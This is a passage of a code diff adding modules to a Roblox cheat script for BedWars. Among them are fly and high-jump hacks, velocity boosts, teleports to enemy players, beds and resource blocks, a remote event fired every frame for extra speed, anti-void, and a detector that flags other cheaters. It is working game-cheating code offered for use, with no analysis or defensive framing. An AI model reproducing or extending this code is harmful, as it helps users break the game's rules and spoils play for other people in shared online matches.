+            RunService.Heartbeat:Connect(onHeartbeat)
+
+            -- Insert your additional speed code here
+            -- Example:
+            -- SpeedBoost()
+        end
+    end
+})
+
+game:GetService('RunService').RenderStepped:Connect(function()
+    local lplr = game:GetService("Players").LocalPlayer
+    local direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
+    local args = {
+        [1] = {
+            ["direction"] = direction
+        }
+    }
+    game:GetService("ReplicatedStorage").rbxts_include.node_modules["@rbxts"].net.out._NetManaged.ScytheDash:FireServer(unpack(args))
+end)
+
+local detectedflyz = {}
+
+local detectedhighjump = {}
+
+function isdetectedfly(user)
+local detectedfly = false
+for i, v in pairs(detectedflyz) do
+if v == user then
+detectedfly = true
+break
+end
+end
+return detectedfly
+end
+
+function isdetectedhigh(user)
+local detectedhigh = false
+for i, v in pairs(detectedhighjump) do
+if v == user then
+detectedhigh = true
+break
+end
+end
+return detectedhigh
+end
+
+function detec()
+task.spawn(function()
+while getgenv().detect == true do
+wait()
+for i,v in pairs(game.Players:GetPlayers()) do
+if v.Character.HumanoidRootPart ~= nil then
+if v.Character.HumanoidRootPart.Position.Y > 900 and not isdetectedfly(v.Name) then
+name = v.Name
+warningNotification("Vape", ""..name.." is using infinite fly!", 60)
+table.insert(detectedflyz,name)
+elseif v.Character.HumanoidRootPart.Velocity.Y > 50 and not isdetectedhigh(v.Name) then
+name = v.Name
+warningNotification("Vape", ""..name.." is using highjump or normal fly!", 60)
+table.insert(detectedhighjump,name)
+end
+end
+end
+end
+end)
+end
+
+runFunction(function()
+local detecthackers = {Enabled = false}
+detecthackers = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+["HoverText"] = "Detects infinite fly and highjump and fly",
+Name = "HackerDetector",
+Function = function(callback)
+if callback then
+getgenv().detect = true
+detec()
+else
+getgenv().detect = false
+end
+end
+})
+end)
+	
+runFunction(function()
+	local hasTeleported = false
+	local TweenService = game:GetService("TweenService")
+
+	function findNearestPlayer()
+		local nearestPlayer = nil
+		local minDistance = math.huge
+
+		for _,v in pairs(game.Players:GetPlayers()) do
+			if v ~= lplr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Team ~= lplr.Team and v.Character:FindFirstChild("Humanoid").Health > 0 then
+				local distance = (v.Character.HumanoidRootPart.Position - lplr.Character.HumanoidRootPart.Position).magnitude
+				if distance < minDistance then
+					nearestPlayer = v
+					minDistance = distance
+				end
+			end
+		end
+		return nearestPlayer
+	end
+
+
+	function tweenToNearestPlayer()
+		local nearestPlayer = findNearestPlayer()
+		if nearestPlayer and not hasTeleported then
+			hasTeleported = true
+
+			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+
+			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.64), {CFrame = nearestPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)})
+			tween:Play()
+		end
+	end
+
+	PlayerTp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+		Name = "PlayerTP",
+		Function = function(callback)
+			if callback then
+				lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				lplr.CharacterAdded:Connect(function()
+					wait(0.3)
+					tweenToNearestPlayer()
+				end)
+				hasTeleported = false
+				PlayerTp["ToggleButton"](false)
+			end
+		end,
+		["HoverText"] = "Teleports you to the closest player that is not on your team"
+	})
+end)
+
+
+
+
+runFunction(function()
+	local hasTeleported = false
+	local TweenService = game:GetService("TweenService")
+
+	function findNearestBed()
+		local nearestBed = nil
+		local minDistance = math.huge
+
+		for _,v in pairs(game.Workspace:GetDescendants()) do
+			if v.Name:lower() == "bed" and v:FindFirstChild("Covers") and v:FindFirstChild("Covers").BrickColor ~= lplr.Team.TeamColor then
+				local distance = (v.Position - lplr.Character.HumanoidRootPart.Position).magnitude
+				if distance < minDistance then
+					nearestBed = v
+					minDistance = distance
+				end
+			end
+		end
+		return nearestBed
+	end
+	function tweenToNearestBed()
+		local nearestBed = findNearestBed()
+		if nearestBed and not hasTeleported then
+			hasTeleported = true
+
+			local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+
+			local tween = TweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.94), {CFrame = nearestBed.CFrame + Vector3.new(0, 10, 0)})
+			tween:Play()
+		end
+	end
+	BedTp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+		Name = "BedTP",
+		Function = function(callback)
+			if callback then
+				lplr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				lplr.CharacterAdded:Connect(function()
+					wait(0.3) 
+					tweenToNearestBed()
+				end)
+				hasTeleported = false
+				BedTp["ToggleButton"](false)
+			end
+		end,
+		["HoverText"] = "TP to the closest bed| Works in 30v30 😱"
+	})
+end)	
+
+
+
+runFunction(function()
+local MidTp = {Enabled = false}
+MidTp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "MidTP",
+Function = function(callback)
+if callback then
+MidTp["ToggleButton"](false)
+  if entityLibrary.isAlive then
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex = game.Players.LocalPlayer.CharacterAdded:Connect(function()
+if not hasTeleported then
+hasTeleported = true
+for i,v in pairs(workspace.Map.Worlds:GetChildren()) do
+local map = v.Name
+local b = workspace.Map.Worlds[map].Blocks.emerald_block.CFrame + Vector3.new(0,10,0)
+wait(0.3)
+local TweenService = game:GetService("TweenService")
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween = TweenService:Create(game.Players.localPlayer.Character.HumanoidRootPart, TweenInfo.new(0.64), {CFrame = b})
+tween:Play()
+wait(5)
+sex:Disconnect()
+end
+end
+hasTeleported = false
+end)
+hasTeleported = false
+end
+end
+end
+})
+end)
+
+
+
+runFunction(function()
+local DimTp = {Enabled = false}
+DimTp = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+["HoverText"] = "Must be holding scythe",
+Name = "DiamondTP",
+Function = function(callback)
+if callback then
+DimTp["ToggleButton"](false)
+  if entityLibrary.isAlive then
+print("NEW VERSION")
+game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
+local sex = game.Players.LocalPlayer.CharacterAdded:Connect(function()
+if not hasTeleported then
+hasTeleported = true
+for i,v in pairs(workspace.Map.Worlds:GetChildren()) do
+local map = v.Name
+local b = workspace.Map.Worlds[map].Blocks.diamond_block.CFrame + Vector3.new(0,10,0)
+wait(0.3)
+local TweenService = game:GetService("TweenService")
+local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0)
+local tween = TweenService:Create(game.Players.localPlayer.Character.HumanoidRootPart, TweenInfo.new(0.64), {CFrame = b})
+tween:Play()
+wait(5)
+sex:Disconnect()
+end
+end
+hasTeleported = false
+end)
+hasTeleported = false
+end
+end
+end
+})
+end)			
+
+runFunction(function()
+	local GalaxywareBoost = {Enabled = false}
+	local GalaxywareBoostMode = {Value = "Velocity"}
+	local GalaxywareBoostJumps = {Value = 10}
+	local GalaxywareBoostJumpsCooldown = {Value = 1}
+	local GalaxywareBoostVeloSpeed = {Value = 650}
+	local GalaxywareBoostCFSpeed = {Value = 50}
+	local GalaxywareBoostCFSlow = {Value = 1}
+	local GalaxywareBoostTweenSpeed = {Value = 1000}
+	local GalaxywareBoostTweenDur = {Value = 4}
+	local GalaxywareBoostNotification = {Enabled = true}
+	GalaxywareBoost = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = "GalaxywareBoost",
+        HoverText = "Let's you jump higher",
+		Function = function(callback)
+			if callback then
+				local JumpedTimes = 0
+				local BoostedCF = 0
+				local Duration = tick()
+				if GalaxywareBoostMode.Value == "Velocity" then
+					task.spawn(function()
+						repeat
+							game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+							JumpedTimes = JumpedTimes + 1
+							task.wait(GalaxywareBoostJumpsCooldown.Value/10)
+						until not GalaxywareBoost.Enabled or GalaxywareBoostMode.Value ~= "Velocity" or JumpedTimes >= GalaxywareBoostJumps.Value
+					end)
+					task.wait(GalaxywareBoostJumpsCooldown.Value/10 * GalaxywareBoostJumps.Value)
+					game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,GalaxywareBoostVeloSpeed.Value,0)
+					if GalaxywareBoostNotification.Enabled then
+						warningNotification("GalaxywareBoost","Boosted " .. GalaxywareBoostVeloSpeed.Value .. " studs in the air in " .. tick() - Duration .. " seconds",5)
+					end
+					GalaxywareBoost.ToggleButton(false)
+					return
+				elseif GalaxywareBoostMode.Value == "CFrame" then
+					game:GetService("Workspace").Gravity = 0
+					task.spawn(function()
+						repeat
+							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,GalaxywareBoostCFSpeed.Value,0)
+							BoostedCF = BoostedCF + GalaxywareBoostCFSpeed.Value
+							task.wait(GalaxywareBoostCFSlow.Value/10)
+						until not GalaxywareBoost.Enabled or GalaxywareBoostMode.Value ~= "CFrame"
+						if GalaxywareBoostNotification.Enabled then
+							warningNotification("GalaxywareBoost","Boosted " .. BoostedCF .. " studs in the air in " .. tick() - Duration .. " seconds",5)
+						end
+					end)
+				elseif GalaxywareBoostMode.Value == "TweenService" then
+					game:GetService("TweenService"):Create(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,TweenInfo.new(GalaxywareBoostTweenDur.Value/10),{
+						CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,GalaxywareBoostTweenSpeed.Value,0)
+					}):Play()
+					if GalaxywareBoostNotification.Enabled then
+						warningNotification("GalaxywareBoost","Tweened " .. GalaxywareBoostTweenSpeed.Value .. " studs in the air in " .. tick() - Duration .. " seconds",5)
+					end
+					GalaxywareBoost.ToggleButton(false)
+					return
+				end
+			else
+				game:GetService("Workspace").Gravity = 192
+			end
+		end
+	})
+	GalaxywareBoostMode = GalaxywareBoost.CreateDropdown({
+		Name = "Mode",
+		List = {
+			"Velocity",
+			"CFrame",
+			"TweenService"
+		},
+		Function = function() end,
+	})
+	GalaxywareBoostJumps = GalaxywareBoost.CreateSlider({
+		Name = "Jumps",
+		Min = 1,
+		Max = 10,
+		Function = function() end,
+		Default = 10
+	})
+	GalaxywareBoostJumpsCooldown = GalaxywareBoost.CreateSlider({
+		Name = "Jumps Cooldown",
+		Min = 1,
+		Max = 3,
+		Function = function() end,
+		Default = 1
+	})
+	GalaxywareBoostVeloSpeed = GalaxywareBoost.CreateSlider({
+		Name = "Velocity Speed",
+		Min = 1,
+		Max = 650,
+		Function = function() end,
+		Default = 650
+	})
+	GalaxywareBoostCFSpeed = GalaxywareBoost.CreateSlider({
+		Name = "CFrame Speed",
+		Min = 1,
+		Max = 50,
+		Function = function() end,
+		Default = 50
+	})
+	GalaxywareBoostCFSlow = GalaxywareBoost.CreateSlider({
+		Name = "CFrame Slowdown",
+		Min = 1,
+		Max = 3,
+		Function = function() end,
+		Default = 1
+	})
+	GalaxywareBoostTweenSpeed = GalaxywareBoost.CreateSlider({
+		Name = "Tween Speed",
+		Min = 1,
+		Max = 1000,
+		Function = function() end,
+		Default = 1000
+	})
+	GalaxywareBoostTweenDur = GalaxywareBoost.CreateSlider({
+		Name = "Tween Duration",
+		Min = 1,
+		Max = 10,
+		Function = function() end,
+		Default = 4
+	})
+	GalaxywareBoostNotification = GalaxywareBoost.CreateToggle({
+		Name = "Notification",
+		Function = function() end,
+	})
+end)
+
+runFunction(function()
+	local GalaxywareAntiVoid = {Enabled = false}
+	local GalaxywareAntiVoidMode = {Value = "Velocity"}
+	local GalaxywareAntiVoidColor = {
+		Hue = 1,
+		Sat = 1,
+		Value = 0.50
+	}
+	local GalaxywareAntiVoidTrans = {Value = 40}
+	local GalaxywareAntiVoidVeloSpeed = {Value = 70}
+	local GalaxywareAntiVoidVeloRepeat = {Value = 5}
+	local GalaxywareAntiVoidCFSpeed = {Value = 10}
+	local GalaxywareAntiVoidCFRepeat = {Value = 3}
+	local GalaxywareAntiVoidJumpRepeat = {Value = 7}
+	local GalaxywareAntiVoidNotification = {Enabled = true}
+	local antivoidypos = 0
+	GalaxywareAntiVoid = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = "GalaxywareAntiVoid",
+		HoverText = "Protects you from the void",
+		Function = function(callback)
+			if callback then
+				local voidpart = Instance.new("Part",game:GetService("Workspace"))
+				-- vape "classic" av mode, cba to make another one
+				task.spawn(function()
+					repeat task.wait() until bedwarsStore.matchState ~= 0 or not vapeInjected
+					if vapeInjected and antivoidypos == 0 then
+						local lowestypos = 99999
+						for i,v in pairs(bedwarsStore.blocks) do 
+							local newray = workspace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
+							if i % 200 == 0 then 
+								task.wait(0.06)
+							end
+							if newray and newray.Position.Y <= lowestypos then
+								lowestypos = newray.Position.Y
+							end
+						end
+						antivoidypos = lowestypos - 8
+					end
+					if voidpart then 
+						voidpart.Position = Vector3.new(0, antivoidypos, 0)
+						voidpart.Parent = workspace
+					end
+				end)
+				-- vape code stops here
+				voidpart.Name = "GalaxywareAntiVoid"
+				voidpart.Size = Vector3.new(2.1e3,0.5,2e3)
+				voidpart.Color = Color3.fromHSV(GalaxywareAntiVoidColor.Hue,GalaxywareAntiVoidColor.Sat,GalaxywareAntiVoidColor.Value)
+				voidpart.Anchored = true
+				voidpart.Transparency = 1 - GalaxywareAntiVoidTrans.Value/100
+				voidpart.Position = Vector3.new(160.5,antivoidypos,247.5)
+				voidpart.Material = Enum.Material.Neon
+				if antivoidypos == 0 then 
+					voidpart.Parent = nil
+				end
+				voidpart.Touched:connect(function(z)
+					if z.Parent:WaitForChild("Humanoid") and z.Parent.Name == game:GetService("Players").LocalPlayer.Name then
+						if GalaxywareAntiVoidMode.Value == "Velocity" then
+							for i = 1,GalaxywareAntiVoidVeloRepeat.Value do
+								task.wait(0.04)
+								game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,GalaxywareAntiVoidVeloSpeed.Value,0)
+							end
+							if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.GalaxywareFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.GalaxywareLongJumpOptionsButton.Api.Enabled) then
+								if GalaxywareAntiVoidNotification.Enabled then
+									warningNotification("GalaxywareAntiVoid","Boosted " .. GalaxywareAntiVoidVeloSpeed.Value .. ".",5)
+								end
+							end
+						elseif GalaxywareAntiVoidMode.Value == "CFrame" then
+							game:GetService("Workspace").Gravity = 0
+							game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+							for i = 1,GalaxywareAntiVoidCFRepeat.Value do
+								game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,GalaxywareAntiVoidCFSpeed.Value,0)
+								task.wait(0.15)
+							end
+							game:GetService("Workspace").Gravity = 192
+							if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.GalaxywareFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.GalaxywareLongJumpOptionsButton.Api.Enabled) then
+								if GalaxywareAntiVoidNotification.Enabled then
+									warningNotification("GalaxywareAntiVoid","Boosted " .. GalaxywareAntiVoidCFSpeed.Value .. ".",5)
+								end
+							end
+						elseif GalaxywareAntiVoidMode.Value == "AutoJump" then
+							for i = 1,GalaxywareAntiVoidJumpRepeat.Value do
+								game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+								task.wait(0.1)
+							end
+							if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.GalaxywareFlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.GalaxywareLongJumpOptionsButton.Api.Enabled) then
+								if GalaxywareAntiVoidNotification.Enabled then
+									warningNotification("GalaxywareAntiVoid","Boosted " .. GalaxywareAntiVoidJumpRepeat.Value .. ".",5)
+								end
+							end
+						end
+					end
+				end)
+			else               
+				game:GetService("Workspace").GalaxywareAntiVoid:Destroy()
+			end
+		end
+	})
+	GalaxywareAntiVoidMode = GalaxywareAntiVoid.CreateDropdown({
+		Name = "Mode",
+		List = {
+			"Velocity",
+			"CFrame",
+			"AutoJump"
+		},
+		Function = function() end,
+	})
+	GalaxywareAntiVoidColor = GalaxywareAntiVoid.CreateColorSlider({
+		Name = "Color",
+		Function = function() end,
+	})
+	GalaxywareAntiVoidTrans = GalaxywareAntiVoid.CreateSlider({
+		Name = "Transparecy",
+		Min = 0,
+		Max = 100,
+		Function = function() end,
+		Default = 40
+	})
+	GalaxywareAntiVoidVeloSpeed = GalaxywareAntiVoid.CreateSlider({
+		Name = "Velocity Speed",
+		Min = 1,
+		Max = 150,
+		Function = function() end,
+		Default = 70
+	})
+	GalaxywareAntiVoidVeloRepeat = GalaxywareAntiVoid.CreateSlider({
+		Name = "Velocity Repeat",
+		Min = 1,
+		Max = 8,
+		Function = function() end,
+		Default = 5
+	})
+	GalaxywareAntiVoidCFSpeed = GalaxywareAntiVoid.CreateSlider({
+		Name = "CFrame Speed",
+		Min = 1,
+		Max = 20,
+		Function = function() end,
+		Default = 10
+	})
+	GalaxywareAntiVoidCFRepeat = GalaxywareAntiVoid.CreateSlider({
+		Name = "CFrame Repeat",
+		Min = 1,
+		Max = 8,
+		Function = function() end,
+		Default = 3
+	})
+	GalaxywareAntiVoidJumpRepeat = GalaxywareAntiVoid.CreateSlider({
+		Name = "Jump Repeat",
+		Min = 1,
+		Max = 20,
+		Function = function() end,
+		Default = 7
+	})
+	GalaxywareAntiVoidNotification = GalaxywareAntiVoid.CreateToggle({
+		Name = "Notification",
+		Function = function() end,
+	})
+end)
+
+runFunction(function()
+	local CustomJump = {Enabled = false}
+	local CustomJumpMode = {Value = "Normal"}
+	local CustomJumpVelocity = {Value = 50}
+	CustomJump = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = "CustomJump",
+        HoverText = "Customizes your jumping ability",
+		Function = function(callback)
+			if callback then
+				game:GetService("UserInputService").JumpRequest:Connect(function()
+					if CustomJumpMode.Value == "Normal" then
+						game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+					elseif CustomJumpMode.Value == "Velocity" then
+						game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity.X,CustomJumpVelocity.Value,game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity.Z)
+					end
+				end)
+			end
+		end
+	})
+	CustomJumpMode = CustomJump.CreateDropdown({
+		Name = "Mode",
+		List = {
+			"Normal",
+			"Velocity"
+		},
+		Function = function() end,
+	})
+	CustomJumpVelocity = CustomJump.CreateSlider({
+		Name = "Velocity",
+		Min = 1,
+		Max = 100,
+		Function = function() end,
+		Default = 50
+	})
+end)
+runFunction(function()
+	local GalaxywareFly = {Enabled = false}
+	local GalaxywareFlyYLevel = {Value = 44}
+	local GalaxywareFlyStill = {Value = 4}
+	local GalaxywareFlyLevelY = {Enabled = true}
+	local GalaxywareFlyTable = {
+		YLevel = GalaxywareFlyYLevel.Value,
+		StillVelo = GalaxywareFlyStill.Value
+	}
+	GalaxywareFly = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = "GalaxywareFly",
+        HoverText = "Makes you go zoom",
+		Function = function(callback)
+			if callback then
+				local velo = GalaxywareFlyTable.StillVelo
+				local dir = 0
+				task.spawn(function()
+					repeat task.wait()
+						local SpacedEvent = game:GetService("UserInputService").InputBegan:Connect(function(input)
+							if input.KeyCode == Enum.KeyCode.Space then
+								dir = 1
+							end
+						end)
+						local SpacedEvent2 = game:GetService("UserInputService").InputEnded:Connect(function(input)
+							if input.KeyCode == Enum.KeyCode.Space then
+								dir = 0
+							end
+						end)
+						local ShiftedEvent = game:GetService("UserInputService").InputBegan:Connect(function(input)
+							if input.KeyCode == Enum.KeyCode.LeftShift then
+								dir = 2
+							end
+						end)
+						local ShiftedEvent2 = game:GetService("UserInputService").InputEnded:Connect(function(input)
+							if input.KeyCode == Enum.KeyCode.LeftShift then
+								dir = 0
+							end
+						end)
+						if GalaxywareFlyLevelY.Enabled then
+							if dir == 0 then
+								game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.X,velo,game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.Z)
+							elseif dir == 1 then
+								game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.X,GalaxywareFlyTable.YLevel,game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.Z)
+							else
+								game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.X,-GalaxywareFlyTable.YLevel,game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.Z)
+							end
+						else
+							game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.X,velo,game:GetService("Players").LocalPlayer.Character.PrimaryPart.Velocity.Z)
+						end
+					until not GalaxywareFly.Enabled
+				end)
+			end
+		end
+	})
+	GalaxywareFlyYLevel = GalaxywareFly.CreateSlider({
+		Name = "Vertical Speed",
+		Min = 1,
+		Max = 100,
+		Function = function() end,
+		Default = 44
+	})
+	GalaxywareFlyStill = GalaxywareFly.CreateSlider({
+		Name = "Still Velocity",
+		Min = 1,
+		Max = 10,
+		Function = function() end,
+		Default = 4
+	})
+	GalaxywareFlyLevelY = GalaxywareFly.CreateToggle({
+		Name = "Y Level",
+		Function = function() end,
+	})
+end)
+
+runFunction(function()
+	local FramesMaxer = {Enabled = false}
+	FramesMaxer = GuiLibrary.ObjectsThatCanBeSaved.GalaxywareWindow.Api.CreateOptionsButton({
+		Name = "FPSUnlocker",
+		HoverText = "Maxes out your Frames Per Second (FPS)",
+		Function = function(callback)
+			if callback then
+				setfpscap(FramesMaxerAmount.Value)
+			else
+				setfpscap(60)
+			end
+		end
+	})
+	FramesMaxerAmount = FramesMaxer.CreateSlider({
+		Name = "Amount",
+		Min = 1,
+		Max = 9e9,
+		Function = function() end,
+		Default = 9e9
+	})
+end)
+
+local nebulasky = {["Enabled"] = false}
+nebulasky = GuiLibrary["ObjectsThatCanBeSaved"]["GalaxywareWindow"]["Api"].CreateOptionsButton({
+	["Name"] = "NebulaSky",
+	["Function"] = function(callback)
+		if callback then
+		local Lighting = game:GetService("Lighting")
+Lighting.Ambient = Color3.fromRGB(111, 43, 150)
+Lighting.ColorShift_Bottom = Color3.fromRGB(111, 43, 150)
+Lighting.ColorShift_Top = Color3.fromRGB(111, 43, 150)
+Lighting.OutdoorAmbient = Color3.fromRGB(111, 43, 150)
+Lighting.ColorShift_Bottom = Color3.fromRGB(111, 43, 150)
+Lighting.ColorShift_Top = Color3.fromRGB(111, 43, 150)
+
+local s = Instance.new("Sky")
+s.Name = "loltroll"
+s.SkyboxBk = "http://www.roblox.com/asset/?id=13581437029"
+s.SkyboxDn = "http://www.roblox.com/asset/?id=13581439832"
+s.SkyboxFt = "http://www.roblox.com/asset/?id=13581447312"
+s.SkyboxLf = "http://www.roblox.com/asset/?id=13581443463"
+s.SkyboxRt = "http://www.roblox.com/asset/?id=13581452875"
+s.SkyboxUp = "http://www.roblox.com/asset/?id=13581450222"
+s.Parent = Lighting
+			else
+		warningNotification("Vape", "Cool sky right", 3)
+		end
+	end
+})
+
+runFunction(function()
+	local VClip = {Enabled = false}
+	VClip = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"]["CreateOptionsButton"]({
+		Name = "AntiNoclip",
+		HoverText = "Prevents you from noclipping into the ground when landing from\nInfiniteFly etc. (Prevents being lagbacked using infinitefly)",
+		Function = function(callback)
+			if callback then
+				task.spawn(function()
+					repeat task.wait() until entityLibrary.isAlive
+					repeat task.wait()
+						if lplr.Character and lplr.Character:FindFirstChild("Humanoid") and lplr.Character.Humanoid.Health > 0 then
+							if lplr.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+								local block, pos = getPlacedBlock(lplr.character.HumanoidRootPart.Position + Vector3.new(0, -3, 0))
+								pos = pos * 3
+								if block and pos then
+									if (pos.Y + 8) >= lplr.Character.PrimaryPart.Position.Y then
+										local velocity = lplr.Character.PrimaryPart.Velocity
+										velocity = Vector2.new(velocity.X, velocity.Z)
+										lplr.Character.PrimaryPart.Velocity = Vector3.new(velocity.X, 0, velocity.Y)
+									end
+								end
+							end
+						end	
+					until not VClip.Enabled
+				end)
+			end
+		end
+	})
+end)
+
+local TweenService = game:GetService("TweenService")
+
+	local function TweenObject(target, properties, time, easingStyle, direction, callback)
+		local info = TweenInfo.new(time, easingStyle, direction)
+		local tween = TweenService:Create(target, info, properties)
+		tween:Play()
+		
+		if callback then
+			tween.Completed:Connect(callback)
+		end
+	end
+
+	local previousTargetHP = 0  
+
+	CustomTargetHud = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+		Name = "CustomTargetHud",
+		Function = function(callback)
+			if callback then 
+local Table = {
+	["_MainGui"] = Instance.new("ScreenGui");
+	["_MainFrame"] = Instance.new("Frame");
+	["_UIStroke"] = Instance.new("UIStroke");
+	["_UIGradient"] = Instance.new("UIGradient");
+	["_LocalScript"] = Instance.new("LocalScript");
+	["_UICorner"] = Instance.new("UICorner");
+	["_DropShadowHolder"] = Instance.new("Frame");
+	["_DropShadow"] = Instance.new("ImageLabel");
+	["_ImageLabel"] = Instance.new("ImageLabel");
+	["_Corner"] = Instance.new("UICorner");
+	["_Stroke"] = Instance.new("UIStroke");
+	["_HealthFrame"] = Instance.new("Frame");
+	["_UICorner1"] = Instance.new("UICorner");
+	["_HP"] = Instance.new("TextLabel");
+	["_User"] = Instance.new("TextLabel");
+	["_Win/Lose"] = Instance.new("TextLabel");
+}
+
+Table["_MainGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Table["_MainGui"].Name = "MainGui"
+Table["_MainGui"].Parent = game:GetService("CoreGui")
+
+Table["_MainFrame"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Table["_MainFrame"].BackgroundTransparency = 0.20000000298023224
+Table["_MainFrame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Table["_MainFrame"].BorderSizePixel = 0
+Table["_MainFrame"].Position = UDim2.new(0.476450503, 0, 0.631067932, 0)
+Table["_MainFrame"].Size = UDim2.new(0, 304, 0, 100)
+Table["_MainFrame"].Name = "MainFrame"
+Table["_MainFrame"].Parent = Table["_MainGui"]
+
+Table["_UIStroke"].Color = Color3.fromRGB(255, 255, 255)
+Table["_UIStroke"].Thickness = 2
+Table["_UIStroke"].Parent = Table["_MainFrame"]
+
+Table["_UIGradient"].Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 251.00000023841858)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 238.00000101327896))
+}
+Table["_UIGradient"].Parent = Table["_UIStroke"]
+
+Table["_UICorner"].Parent = Table["_MainFrame"]
+
+Table["_DropShadowHolder"].BackgroundTransparency = 1
+Table["_DropShadowHolder"].BorderSizePixel = 0
+Table["_DropShadowHolder"].Size = UDim2.new(1, 0, 1, 0)
+Table["_DropShadowHolder"].ZIndex = 0
+Table["_DropShadowHolder"].Name = "DropShadowHolder"
+Table["_DropShadowHolder"].Parent = Table["_MainFrame"]
+
+Table["_DropShadow"].Image = "rbxassetid://6014261993"
+Table["_DropShadow"].ImageColor3 = Color3.fromRGB(0, 0, 0)
+Table["_DropShadow"].ImageTransparency = 0.5
+Table["_DropShadow"].ScaleType = Enum.ScaleType.Slice
+Table["_DropShadow"].SliceCenter = Rect.new(49, 49, 450, 450)
+Table["_DropShadow"].AnchorPoint = Vector2.new(0.5, 0.5)
+Table["_DropShadow"].BackgroundTransparency = 1
+Table["_DropShadow"].BorderSizePixel = 0
+Table["_DropShadow"].Position = UDim2.new(0.5, 0, 0.5, 0)
+Table["_DropShadow"].Size = UDim2.new(1, 47, 1, 47)
